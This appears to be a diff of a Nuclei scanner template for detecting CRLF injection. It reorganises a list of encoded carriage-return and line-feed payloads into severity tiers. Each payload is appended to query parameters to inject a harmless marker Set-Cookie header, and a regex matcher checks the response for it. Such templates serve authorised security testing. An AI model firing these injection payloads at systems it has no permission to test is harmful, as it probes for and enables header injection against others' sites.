@@ -2,76 +2,75 @@ id: crlf-injection
 
 info:
   name: CRLF Injection
-  author: reewardius
-  severity: medium
-  reference:
-    - https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a
-    - https://github.com/r0075h3ll/Oralyzer/blob/master/core/crlf.py
-    - https://infosecwriteups.com/6000-with-microsoft-hall-of-fame-microsoft-firewall-bypass-crlf-to-xss-microsoft-bug-bounty-8f6615c47922
-  tags: fuzzing-crlf,fuzzing-req,dast
-  
+  author: pdteam
+  severity: low
+  metadata:
+    max-request: 41
+  tags: crlf,dast
+
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}"
-      
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
     payloads:
       escape:
-        - "%00"
-        - "%09%0A"
-        - "%09%0D"
-        - "%09%0D%0A"
-        - "%0a"
-        - "%0a%20"
-        - "%0d"
-        - "%0d%09"
-        - "%0d%0a"
-        - "%0d%0a%09"
-        - "%0d%0a%20"
-        - "%0d%20"
-        - "%20"
-        - "%20%0a"
-        - "%20%0d"
-        - "%20%0d%0a"
-        - "%23%0a"
-        - "%23%0a%20"
-        - "%23%0d"
-        - "%23%0d%0a"
-        - "%23%oa"
-        - "%25%30"
-        - "%25%30%61"
-        - "%2e%2e%2f%0d%0a"
-        - "%2f%2e%2e%0d%0a"
-        - "%2f..%0d%0a"
-        - "%3f"
-        - "%3f%0a"
-        - "%3f%0d"
-        - "%3f%0d%0a"
-        - "%C0%8D%C0%8A"
-        - "%C4%8A"
-        - "%C4%8D%C4%8A"
-        - "%EA%A8%8A"
-        - "%EA%A8%8D"
-        - "%EA%A8%8D%EA%A8%8A"
-        - "%e5%98%8a%e5%98%8d"
-        - "%e5%98%8a%e5%98%8d%0a"
-        - "%e5%98%8a%e5%98%8d%0d"
-        - "%e5%98%8a%e5%98%8d%0d%0a"
-        - "%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8d"
-        - "%u0000"
-        - "%u000a"
-        - "%u000d"
-        
+        low:
+          - "%00"
+          - "%0a"
+          - "%0a%20"
+          - "%0d"
+          - "%0d%09"
+          - "%0d%0a"
+          - "%0d%0a%09"
+          - "%0d%0a%20"
+          - "%0d%20"
+          - "%20"
+        medium:
+          - "%20%0a"
+          - "%20%0d"
+          - "%20%0d%0a"
+          - "%23%0a"
+          - "%23%0a%20"
+          - "%23%0d"
+          - "%23%0d%0a"
+          - "%23%oa"
+          - "%25%30"
+          - "%25%30%61"
+          - "%2e%2e%2f%0d%0a"
+          - "%2f%2e%2e%0d%0a"
+          - "%2f..%0d%0a"
+          - "%3f"
+        high:
+          - "%3f%0a"
+          - "%3f%0d"
+          - "%3f%0d%0a"
+          - "%e5%98%8a%e5%98%8d"
+          - "%e5%98%8a%e5%98%8d%0a"
+          - "%e5%98%8a%e5%98%8d%0d"
+          - "%e5%98%8a%e5%98%8d%0d%0a"
+          - "%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8d"
+          - "%u0000"
+          - "%u000a"
+          - "%u000d"
+          - "\r"
+          - "\r%20"
+          - "\r\n"
+          - "\r\n%20"
+          - "\r\n\t"
+          - "\r\t"
+
     fuzzing:
       - part: query
         type: postfix
-        mode: single
         fuzz:
           - "{{escape}}Set-Cookie:crlfinjection=crlfinjection"
-          
+
     stop-at-first-match: true
     matchers:
       - type: regex
         part: header
         regex:
           - '(?m)^(?:Set-Cookie\s*?:(?:\s*?|.*?;\s*?))(crlfinjection=crlfinjection)(?:\s*?)(?:$|;)'
+# digest: 490a0046304402207aa726063271f4d72767f3b169e78d368ba236528480b07fb10a1b69566a5b9802205ad647d96c56b8537d8358fd28d46028dd9de50a94f51b66de564f07ed371894:922c64590222798bb761d5b6d8e72950
